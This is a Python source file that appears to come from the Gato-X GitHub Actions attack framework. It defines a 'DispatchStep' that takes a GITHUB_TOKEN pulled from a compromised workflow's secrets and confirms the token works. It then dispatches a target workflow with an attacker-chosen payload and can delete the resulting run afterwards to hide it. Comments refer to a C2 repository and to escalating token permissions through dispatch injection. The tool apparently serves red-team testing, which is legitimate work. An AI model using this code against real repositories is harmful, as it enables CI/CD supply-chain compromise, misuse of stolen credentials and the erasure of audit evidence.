import time

from gatox.attack.pwnrequest.steps.attack_step import AttackStep
from gatox.github.api import Api

from gatox.cli.output import Output
from gatox.attack.utilities import AttackUtilities


class DispatchStep(AttackStep):
    """Dispatch step, which respresents issuing a workflow dispatch
    event with a given payload.
    """

    def __init__(
        self,
        target_repository,
        target_workflow: str,
        payload: dict,
        target_branch: str = None,
        delete_run: bool = False,
    ):
        """Initialize the step with the target repository, branch, workflow, and payload."""
        self.target_repo = target_repository
        self.step_data = (
            f"Dispatch - Target Workflow: {target_branch}:{target_workflow}"
        )
        self.target_workflow = target_workflow
        self.target_branch = target_branch
        self.payload = payload
        self.delete_run = delete_run

    def setup(self, api):
        """Checks and setup."""
        branch_resp = api.call_get(
            f"/repos/{self.target_repo}/branches/{self.target_branch}"
        )
        if branch_resp.status_code != 200:
            Output.error(f"Branch {self.target_branch} not found in {self.target_repo}")
            return False
        else:
            self.head_sha = branch_resp.json()["commit"]["sha"]

        workflow_status = api.call_get(
            f"/repos/{self.target_repo}/actions/workflows/{self.target_workflow}"
        )
        if workflow_status.status_code != 200:
            Output.error(
                f"Workflow {self.target_workflow} not found in {self.target_repo}"
            )
            return False
        else:
            workflow_status = workflow_status.json()
            if workflow_status["state"] == "disabled":
                Output.error(
                    f"Workflow {self.target_workflow} is not enabled in {self.target_repo}"
                )
                return False

        return True

    @AttackStep.require_params("secrets")
    def preflight(self, api, secrets=None):
        """Validates preconditions for executing this step."""

        self.credential = secrets["values"]["system.github.token"]

        status = api.call_get(
            f"/installation/repositories", credential_override=self.credential
        )
        if status.status_code == 401:
            Output.error("Token invalid or expired!")
            return False

        Output.owned(f"Token is valid!")
        # We need to pass the secrets on.
        self.output["secrets"] = secrets

        return True

    def execute(self, api):
        """Execute the step after validating pre-conditions."""
        status = api.dispatch_workflow(
            self.target_workflow,
            self.target_branch,
            self.payload,
            credential_override=self.credential,
        )

        if status.status_code != 204:
            Output.error(
                f"Failed to dispatch {self.target_workflow} on {self.target_branch}, does the token have actions: write?"
            )

            return False
        else:
            Output.info(
                f"Successfully dispatched {self.target_workflow} on {self.target_branch}!"
            )

            # Deleting runs requires waiting until the workflow finishes.
            # For very complex chains (such as escalating GITHUB_TOKEN permissions via dispatch injection)
            # you may want to not delete the run and instead do it manually from the first workflow's token.
            if self.delete_run:
                curr_time = AttackUtilities.get_current_time()
                workflow_id = api.get_recent_workflow(
                    self.target_repo,
                    self.head_sha,
                    self.target_workflow,
                    time_after=f">{curr_time}",
                )

                for _ in range(self.timeout):
                    status = api.get_workflow_status(self.target_repo, workflow_id)
                    if status == -1 or status == 1:
                        # We just need it to finish.
                        break
                    else:
                        time.sleep(1)
                else:
                    Output.error(
                        "The workflow is incomplete but hit the timeout, "
                        "check the C2 repository manually to debug!"
                    )
                    return False

                status = api.delete_workflow_run(self.target_repo, workflow_id)
